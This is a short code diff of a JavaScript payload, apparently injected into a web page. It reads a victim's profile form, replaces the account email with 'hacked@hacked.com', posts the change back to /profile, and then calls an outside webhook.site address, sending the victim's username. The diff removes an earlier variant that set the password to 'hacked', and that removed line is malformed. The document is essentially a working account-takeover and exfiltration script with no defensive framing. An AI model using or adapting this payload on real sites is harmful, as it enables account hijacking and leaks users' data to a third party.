@@ -11,14 +11,12 @@ fetch('/profile')
     params.append('username', doc.querySelector('input[name="username"]').value);
     params.append('firstname', doc.querySelector('input[name="firstname"]').value);
     params.append('lastname', doc.querySelector('input[name="lastname"]').value);
-    params.append('email', doc.querySelector('input[name="email"]').value);
-    params.append('password' 'hacked');
-    params.append('passwordCheck', 'hacked');
+    params.append('email', 'hacked@hacked.com');
 
 
-    return fetch('/profile', {
+    fetch('/profile', {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: params.toString()
-    });
+    }).then(() => fetch('https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5?sucess=true&username=' + params.get('username'))
   })
